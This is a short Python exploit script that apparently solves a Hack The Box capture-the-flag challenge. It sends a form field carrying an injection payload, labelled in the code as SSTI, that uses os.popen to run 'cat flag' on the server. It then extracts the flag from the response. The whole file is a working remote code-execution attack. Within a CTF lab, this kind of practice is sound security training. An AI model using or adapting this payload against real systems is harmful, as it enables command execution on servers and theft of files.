import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

# SSTI payload
data = {
    "ingredient": "x",
    "measurements": "__import__('os').popen('cat flag').read()"
}

try:
    r = requests.post(url, data=data)
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
    sys.exit(1)

#Searching for flag
flag = re.search(r"HTB\{.*?\}", r.text)
if flag:
    print("Flag:", flag.group(0))
else:
    print("Flag not found!")
